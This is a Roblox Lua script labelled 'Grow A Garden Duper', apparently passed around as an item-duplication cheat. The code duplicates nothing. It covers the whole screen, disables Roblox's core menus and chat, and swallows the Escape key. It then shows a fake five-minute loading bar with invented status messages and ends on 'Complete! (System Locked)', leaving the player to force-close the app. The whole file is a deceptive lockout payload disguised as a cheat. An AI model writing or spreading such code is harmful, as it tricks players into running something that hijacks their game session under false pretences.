-- Create the loading screen GUI
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "FullScreenLoader"
gui.DisplayOrder = 999999  -- Ensure it's on top of everything
gui.IgnoreGuiInset = true  -- Cover the entire screen including top/bottom bars
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Create the main background (full screen)
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
background.BorderSizePixel = 0
background.ZIndex = 10
background.Parent = gui

-- Create the loading frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.6, 0, 0.25, 0)
frame.Position = UDim2.new(0.2, 0, 0.375, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.ZIndex = 11
frame.Parent = gui

-- Add a title
local title = Instance.new("TextLabel")
title.Text = "Grow A Garden Duper"
title.Size = UDim2.new(1, 0, 0.3, 0)
title.Position = UDim2.new(0, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(100, 255, 100)
title.Font = Enum.Font.GothamBold
title.TextSize = 28
title.ZIndex = 12
title.Parent = frame

-- Add a loading bar background
local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(0.8, 0, 0.15, 0)
barBackground.Position = UDim2.new(0.1, 0, 0.5, 0)
barBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
barBackground.BorderSizePixel = 0
barBackground.ZIndex = 12
barBackground.Parent = frame

-- Add the actual loading bar
local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
loadingBar.BorderSizePixel = 0
loadingBar.ZIndex = 13
loadingBar.Parent = barBackground

-- Add percentage text
local percentage = Instance.new("TextLabel")
percentage.Text = "0%"
percentage.Size = UDim2.new(1, 0, 0.3, 0)
percentage.Position = UDim2.new(0, 0, 0.7, 0)
percentage.BackgroundTransparency = 1
percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
percentage.Font = Enum.Font.Gotham
percentage.TextSize = 18
percentage.ZIndex = 12
percentage.Parent = frame

-- Add a status message
local status = Instance.new("TextLabel")
status.Text = "Initializing..."
status.Size = UDim2.new(1, 0, 0.2, 0)
status.Position = UDim2.new(0, 0, 0.3, 0)
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.Font = Enum.Font.Gotham
status.TextSize = 16
status.ZIndex = 12
status.Parent = frame

-- Disable core Roblox GUIs
local function disableCoreGuis()
    local coreGuiService = game:GetService("StarterGui")
    coreGuiService:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    
    -- Also disable chat
    if player:FindFirstChild("PlayerGui") then
        local chatGui = player.PlayerGui:FindFirstChild("Chat")
        if chatGui then
            chatGui.Enabled = false
        end
    end
end

-- Prevent escape menu from opening
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")

local function blockEscape(actionName, inputState, inputObject)
    if inputState == Enum.UserInputState.Begin and inputObject.KeyCode == Enum.KeyCode.Escape then
        return Enum.ContextActionResult.Sink
    end
end

ContextActionService:BindAction("BlockEscape", blockEscape, false, Enum.KeyCode.Escape)

-- Animation function
local function animateLoading()
    local startTime = tick()
    local duration = 300 -- 5 minutes in seconds
    local endTime = startTime + duration
    
    -- List of possible status messages
    local statusMessages = {
        "Loading assets...",
        "Connecting to server...",
        "Planting seeds...",
        "Watering plants...",
        "Growing flowers...",
        "Optimizing performance...",
        "Almost there...",
        "Finalizing..."
    }
    
    while tick() < endTime do
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        
        -- Update loading bar
        loadingBar.Size = UDim2.new(progress, 0, 1, 0)
        percentage.Text = math.floor(progress * 100) .. "%"
        
        -- Update status message every 15% progress
        local messageIndex = math.floor(progress * #statusMessages) + 1
        if messageIndex <= #statusMessages then
            status.Text = statusMessages[messageIndex]
        end
        
        wait(0.1)
    end
    
    -- Set to 100% and get stuck
    loadingBar.Size = UDim2.new(1, 0, 1, 0)
    percentage.Text = "100%"
    status.Text = "Complete! (System Locked)"
    
    -- The loading screen will now stay at 100% indefinitely
    -- Player must close the app to exit
end

-- Initialize
disableCoreGuis()
animateLoading()
